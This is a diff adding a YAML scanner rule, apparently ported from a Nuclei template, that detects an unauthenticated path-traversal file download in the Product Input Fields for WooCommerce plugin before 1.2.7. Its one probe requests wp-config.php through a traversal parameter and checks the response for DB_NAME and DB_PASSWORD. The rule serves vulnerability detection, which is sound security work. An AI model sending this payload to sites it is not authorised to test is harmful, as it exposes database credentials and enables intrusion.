@@ -1,0 +1,32 @@
+schema_version: 1
+id: "cortex.community:wp-woocommerce-file-download"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Product Input Fields for WooCommerce < 1.2.7 - Unauthenticated File Download"
+  description: "WordPress WooCommerce < 1.2.7 is susceptible to file download vulnerabilities. The lack of authorization checks in the handle_downloads() function hooked to admin_init() could allow unauthenticated users to download arbitrary files from the blog using a path traversal payload. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://wpscan.com/vulnerability/15f345e6-fc53-4bac-bc5a-de898181ea74"
+    - "https://blog.nintechnet.com/high-severity-vulnerability-fixed-in-product-input-fields-for-woocommerce/"
+  cwes: [22]
+  tags: ["wordpress", "woocommerce", "lfi", "wp-plugin", "wp", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_NAME" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "DB_PASSWORD" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
